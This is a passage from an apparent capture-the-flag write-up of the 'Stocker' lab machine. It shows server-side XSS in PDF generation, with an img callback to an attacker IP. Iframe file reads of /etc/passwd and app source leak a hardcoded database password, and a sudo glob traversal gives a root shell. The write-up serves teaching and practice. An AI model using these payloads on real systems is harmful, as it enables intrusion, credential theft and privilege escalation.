<span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s2">&quot;.add-to-basket&quot;</span><span class="p">)).</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">button</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">button</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">productStore</span><span class="p">.</span><span class="nx">find</span><span class="p">((</span><span class="nx">product</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">product</span><span class="p">.</span><span class="nx">_id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">button</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&quot;product-id&quot;</span><span class="p">));</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">product</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">existing</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">basket</span><span class="p">.</span><span class="nx">find</span><span class="p">((</span><span class="nx">basketItem</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">basketItem</span><span class="p">.</span><span class="nx">_id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">product</span><span class="p">.</span><span class="nx">_id</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">existing</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">existing</span><span class="p">.</span><span class="nx">amount</span><span class="o">++</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">basket</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span><span class="w"> </span><span class="p">...</span><span class="nx">product</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Added to basket!&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">basket</span><span class="p">);</span>
<span class="w">  </span><span class="p">});</span>
<span class="p">});</span>
<span class="p">});</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">beforePurchase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#before-purchase&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">afterPurchase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#after-purchase&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">cartTable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#cart-table&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">submitPurchase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#submit-purchase&quot;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">purchaseOrderLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#purchase-order-link&quot;</span><span class="p">);</span>

<span class="nx">cartModalElement</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;show.bs.modal&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="nx">beforePurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="nx">afterPurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;none&quot;</span><span class="p">;</span>

<span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s2">&quot;.basket-item&quot;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">item</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">item</span><span class="p">.</span><span class="nx">remove</span><span class="p">());</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#basket-template&quot;</span><span class="p">);</span>

<span class="nx">basket</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">basketItem</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">template</span><span class="p">.</span><span class="nx">content</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">$$</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">selector</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">clone</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="nx">selector</span><span class="p">);</span>

<span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-name&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">basketItem</span><span class="p">.</span><span class="nx">title</span><span class="p">;</span>

<span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-quantity&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">basketItem</span><span class="p">.</span><span class="nx">amount</span><span class="p">;</span>
<span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-price&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`£</span><span class="si">${</span><span class="nx">basketItem</span><span class="p">.</span><span class="nx">price</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>

<span class="nx">cartTable</span><span class="p">.</span><span class="nx">prepend</span><span class="p">(</span><span class="nx">clone</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#cart-total&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">basket</span>
<span class="p">.</span><span class="nx">map</span><span class="p">((</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">price</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">amount</span><span class="p">)</span>
<span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">);</span>

<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">basket</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="nx">submitPurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="nx">submitPurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;none&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">});</span>

<span class="nx">submitPurchase</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;/api/order&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;POST&quot;</span><span class="p">,</span>
<span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">basket</span><span class="w"> </span><span class="p">}),</span>
<span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
<span class="p">},</span>
<span class="p">})</span>
<span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Something went wrong processing your order!&quot;</span><span class="p">);</span>

<span class="w">  </span><span class="nx">purchaseOrderLink</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;href&quot;</span><span class="p">,</span><span class="w"> </span><span class="sb">`/api/po/</span><span class="si">${</span><span class="nx">response</span><span class="p">.</span><span class="nx">orderId</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#order-id&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">orderId</span><span class="p">;</span>

<span class="w">  </span><span class="nx">beforePurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;none&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="nx">afterPurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="nx">submitPurchase</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;none&quot;</span><span class="p">;</span>
<span class="p">});</span>
<span class="p">});</span>
</pre></div>
</div>
<p>when sending the cart to /api/order we get the following data back:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="mi">28</span> <span class="n">Jan</span> <span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">41</span> <span class="n">GMT</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">53</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="p">:</span> <span class="n">Express</span>
<span class="n">ETag</span><span class="p">:</span> <span class="n">W</span><span class="o">/</span><span class="s2">&quot;35-ez94hP3JKzcX6Wxf3ttYsRvF5Cg&quot;</span>

<span class="p">{</span>
  <span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="n">true</span><span class="p">,</span>
  <span class="s2">&quot;orderId&quot;</span><span class="p">:</span> <span class="s2">&quot;63d534d98816952dec5f2c60&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>And the client side app diplays that for us:
<img alt="thanks.png" src="../../../../_images/thanks.png" /></p>
<p>The <code class="docutils literal notranslate"><span class="pre">here</span></code> hyperlink is Getting <code class="docutils literal notranslate"><span class="pre">http://dev.stocker.htb/api/po/63d534d98816952dec5f2c60</span></code>, which is a pdf with the order details of the order we just sent:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>exiftool<span class="w"> </span>stocker.pdf
ExifTool<span class="w"> </span>Version<span class="w"> </span>Number<span class="w">         </span>:<span class="w"> </span><span class="m">12</span>.54
File<span class="w"> </span>Name<span class="w">                       </span>:<span class="w"> </span>stocker.pdf
Directory<span class="w">                       </span>:<span class="w"> </span>.
File<span class="w"> </span>Size<span class="w">                       </span>:<span class="w"> </span><span class="m">38</span><span class="w"> </span>kB
File<span class="w"> </span>Modification<span class="w"> </span>Date/Time<span class="w">     </span>:<span class="w"> </span><span class="m">2023</span>:01:28<span class="w"> </span><span class="m">14</span>:28:39+00:00
File<span class="w"> </span>Access<span class="w"> </span>Date/Time<span class="w">           </span>:<span class="w"> </span><span class="m">2023</span>:01:28<span class="w"> </span><span class="m">14</span>:28:39+00:00
File<span class="w"> </span>Inode<span class="w"> </span>Change<span class="w"> </span>Date/Time<span class="w">     </span>:<span class="w"> </span><span class="m">2023</span>:01:28<span class="w"> </span><span class="m">14</span>:29:46+00:00
File<span class="w"> </span>Permissions<span class="w">                </span>:<span class="w"> </span>-rw-r--r--
File<span class="w"> </span>Type<span class="w">                       </span>:<span class="w"> </span>PDF
File<span class="w"> </span>Type<span class="w"> </span>Extension<span class="w">             </span>:<span class="w"> </span>pdf
MIME<span class="w"> </span>Type<span class="w">                       </span>:<span class="w"> </span>application/pdf
PDF<span class="w"> </span>Version<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>.4
Linearized<span class="w">                      </span>:<span class="w"> </span>No
Page<span class="w"> </span>Count<span class="w">                      </span>:<span class="w"> </span><span class="m">1</span>
Tagged<span class="w"> </span>PDF<span class="w">                      </span>:<span class="w"> </span>Yes
Creator<span class="w">                         </span>:<span class="w"> </span>Chromium
Producer<span class="w">                        </span>:<span class="w"> </span>Skia/PDF<span class="w"> </span>m108
Create<span class="w"> </span>Date<span class="w">                     </span>:<span class="w"> </span><span class="m">2023</span>:01:28<span class="w"> </span><span class="m">14</span>:50:08+00:00
Modify<span class="w"> </span>Date<span class="w">                     </span>:<span class="w"> </span><span class="m">2023</span>:01:28<span class="w"> </span><span class="m">14</span>:50:08+00:00
</pre></div>
</div>
<p>Looking to see if that library is vulnerable, there are issues with other components of skia, but it doesn’t look like the pdf generation is vulnerable.</p>
<p>The pdf itself mentions the email <code class="docutils literal notranslate"><span class="pre">support&#64;stock.htb</span></code> we can try to see if this is beeing opened by some support bot, in which case we be able to leverage this for XSS.</p>
</section>
<section id="server-side-xss">
<h2>Server Side XSS<a class="headerlink" href="#server-side-xss" title="Permalink to this heading">#</a></h2>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;http://10.10.14.53:8000/baniania&#39;</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>We get a callback, from the server’s IP, and this is happening without any delay, looks like at the same time as the pdf is beeing generated, this looks like there is Server Side XSS in the pdf generation.</p>
<p>Following hacktricks page on <a class="reference external" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">Server Side XSS</a> until something sticks:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">file:///etc/passwd</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;560&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;315&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</pre></div>
</div>
</section>
<section id="xss-to-ssrf-arbitrary-file-read">
<h2>XSS to SSRF / arbitrary file read<a class="headerlink" href="#xss-to-ssrf-arbitrary-file-read" title="Permalink to this heading">#</a></h2>
<p>The iframe worked, and this gives us an arbitrary file read / SSRF.<br />
<img alt="iframe.png" src="../../../../_images/iframe.png" /></p>
<p>We just need to make the iframe slightly bigger to be able to see the whole content of the file:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">file:///etc/passwd</span> <span class="na">width</span><span class="o">=</span><span class="s">\&quot;560\&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">\&quot;700\&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</pre></div>
</div>
<p><img alt="big-iframe.png" src="../../../../_images/big-iframe.png" /></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>sh$<span class="w"> </span>passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:112:119:fwupd-refresh
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
</pre></div>
</div>
<p>Remember that guy from the main page?<br />
Angoose Garden, Head of IT at Stockers Ltd.<br />
does he have a private key?</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">file:///home/angoose/.ssh/id_rsa</span> <span class="na">width</span><span class="o">=</span><span class="s">\&quot;560\&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">\&quot;700\&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>no</p>
</section>
<section id="credential-reuse">
<h2>Credential reuse<a class="headerlink" href="#credential-reuse" title="Permalink to this heading">#</a></h2>
<p>We already know that the app is using mongo, so maybe we can try to leak the db password in case it was reused? Looking at this blog post from <a class="reference external" href="https://www.mongodb.com/blog/post/quick-start-nodejs-mongodb-how-to-get-connected-to-your-database">mongodb.com</a> it looks like they’re just setting a const uri with a connection string that has the creds, directly in the code, lets see if we can get our hands on that.</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">file:///var/www/dev/node_modules/raw-body/index.js</span> <span class="na">width</span><span class="o">=</span><span class="s">\&quot;560\&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">\&quot;700\&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">file:///etc/mongod.conf</span> <span class="na">width</span><span class="o">=</span><span class="s">\&quot;560\&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">\&quot;700\&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">file:///var/www/dev/index.js</span> <span class="na">width</span><span class="o">=</span><span class="s">\&quot;560\&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">\&quot;700\&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>It was simply in the index.js file</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;express&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">mongoose</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;mongoose&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;express-session&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">MongoStore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;connect-mongo&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;path&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;fs&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">generatePDF</span><span class="p">,</span><span class="w"> </span><span class="nx">formatHTML</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;./pdf.js&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">randomBytes</span><span class="p">,</span><span class="w"> </span><span class="nx">createHash</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;crypto&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">();</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3000</span><span class="p">;</span>
<span class="c1">// TODO: Configure loading from dotenv for production</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">dbURI</span><span class="w"> </span><span class="o">=</span>
<span class="s2">&quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?</span>
<span class="s2">authSource=admin&amp;w=1&quot;</span><span class="p">;</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="w"> </span><span class="nx">extended</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">}));</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span>
<span class="nx">session</span><span class="p">({</span>
<span class="nx">secret</span><span class="o">:</span><span class="w"> </span><span class="nx">randomBytes</span><span class="p">(</span><span class="mf">32</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s2">&quot;hex&quot;</span><span class="p">),</span>
<span class="nx">resave</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="nx">saveUninitialized</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="nx">store</span><span class="o">:</span><span class="w"> </span><span class="nx">MongoStore</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
<span class="nx">mongoUrl</span><span class="o">:</span><span class="w"> </span><span class="nx">dbURI</span><span class="p">,</span>
<span class="p">}),</span>
<span class="p">})</span>
<span class="p">);</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>user.txt<span class="w"> </span><span class="p">|</span>wc<span class="w"> </span>-c
<span class="m">33</span>
</pre></div>
</div>
</section>
<section id="privesc-enum">
<h2>Privesc enum<a class="headerlink" href="#privesc-enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>angoose@stocker:/opt/google/chrome$<span class="w"> </span>sudo<span class="w"> </span>-l
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>angoose:
Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>angoose<span class="w"> </span>on<span class="w"> </span>stocker:
<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User<span class="w"> </span>angoose<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>stocker:
<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>/usr/bin/node<span class="w"> </span>/usr/local/scripts/*.js
</pre></div>
</div>
</section>
<section id="code-execution-as-root-due-to-globing-in-the-sudo-line">
<h2>Code execution as root due to globing in the sudo line<a class="headerlink" href="#code-execution-as-root-due-to-globing-in-the-sudo-line" title="Permalink to this heading">#</a></h2>
<p>So because of the globing we can do some directory traversal with that, we just have to drop a node.js script that will drop a shell and preserve root privileges:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>angoose@stocker:/usr/local/scripts$<span class="w"> </span>cat<span class="w"> </span>/dev/shm/test.js
require<span class="o">(</span><span class="s2">&quot;child_process&quot;</span><span class="o">)</span>.spawn<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span>,<span class="w"> </span><span class="o">[</span><span class="s2">&quot;-p&quot;</span><span class="o">]</span>,<span class="w"> </span><span class="o">{</span>stdio:<span class="w"> </span><span class="o">[</span><span class="m">0</span>,<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="m">2</span><span class="o">]})</span>
</pre></div>
</div>
<p>And we can call that with some simple path traversal</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>angoose@stocker:/usr/local/scripts$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/node<span class="w"> </span>/usr/local/scripts/../../../dev/shm/test.js
<span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
<span class="c1"># wc ~/root.txt -c</span>
<span class="m">33</span><span class="w"> </span>/root/root.txt
</pre></div>
</div>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../support/support.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Support</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../soccer/soccer.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Soccer</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
